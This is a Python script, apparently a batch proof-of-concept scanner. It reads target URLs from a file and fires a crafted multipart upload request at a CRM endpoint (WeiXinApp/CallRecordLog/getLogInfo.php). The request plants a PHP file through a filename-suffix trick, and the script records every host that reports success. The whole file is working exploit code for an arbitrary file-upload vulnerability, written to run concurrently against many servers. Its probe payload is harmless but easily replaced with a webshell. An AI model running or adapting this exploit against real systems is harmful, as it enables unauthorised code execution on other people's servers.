import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 线程数
THREADS = 50

def check_vulnerability(url):
    try:
        # 构建完整的URL路径
        target_url = url.rstrip('/') + "/crm/WeiXinApp/CallRecordLog/getLogInfo.php?callednumber&gettype=uploadfile&sessionvalue=4c27a43b8db69ca2a504d7be0026a480&uploadfilename=itwkqx.php......&userid"
        
        # 请求头
        headers = {
            'Host': url.split('//')[1].split('/')[0] if '//' in url else url.split('/')[0],
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW',
            'Accept-Encoding': 'gzip',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
        }
        
        # 请求体
        data = '''------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="uploaded file"; filename="itwkgx.avi"
Content-Type: image/jpeg

<?php print(111*222);unlink(__FILE__);?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--'''
        
        #不跟随重定向
        response = requests.post(
            target_url,
            headers=headers,
            data=data,
            verify=False,
            allow_redirects=False,
            timeout=10
        )
        
        # 检查状态码和响应内容
        if 300 <= response.status_code < 400:
            print(f"[INFO] {url} - 状态码 {response.status_code} (重定向)，漏洞不存在")
            return None
        
        elif response.status_code == 200:
            if '"msg":"success"' in response.text:
                print(f"[VULNERABLE] {url} - 漏洞存在!")
                return {
                    'url': url,
                    'target_url': target_url,
                    'status_code': response.status_code,
                    'response_text': response.text[:500]  # 只保存前500字符
                }
            else:
                print(f"[INFO] {url} - 状态码 200 但响应不包含成功消息，漏洞不存在")
                return None
        else:
            print(f"[INFO] {url} - 状态码 {response.status_code}，漏洞不存在")
            return None
            
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] {url} - 请求失败: {str(e)}")
        return None
    except Exception as e:
        print(f"[ERROR] {url} - 发生错误: {str(e)}")
        return None

def main():
    # 检查url.txt文件是否存在
    if not os.path.exists('url.txt'):
        print("[ERROR] url.txt 文件不存在!")
        return
    
    # 读取URL列表
    with open('url.txt', 'r', encoding='utf-8') as f:
        urls = [line.strip() for line in f if line.strip()]
    
    if not urls:
        print("[INFO] url.txt 中没有找到有效的URL")
        return
    
    print(f"[INFO] 开始检测 {len(urls)} 个URL，线程数: {THREADS}")
    
    vulnerable_results = []

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        future_to_url = {executor.submit(check_vulnerability, url): url for url in urls}

        for future in as_completed(future_to_url):
            result = future.result()
            if result:
                vulnerable_results.append(result)
    if vulnerable_results:
        with open('result.txt', 'w', encoding='utf-8') as f:
            f.write("发现的漏洞详情:\n")
            f.write("=" * 50 + "\n\n")
            
            for i, result in enumerate(vulnerable_results, 1):
                f.write(f"漏洞 #{i}:\n")
                f.write(f"目标URL: {result['url']}\n")
                f.write(f"完整请求URL: {result['target_url']}\n")
                f.write(f"状态码: {result['status_code']}\n")
                f.write(f"响应内容(前500字符): {result['response_text']}\n")
                f.write("-" * 50 + "\n\n")
        
        print(f"\n[SUCCESS] 发现 {len(vulnerable_results)} 个漏洞，详情已保存到 result.txt")
    else:
        print(f"\n[INFO] 未发现任何漏洞")

if __name__ == "__main__":
    main()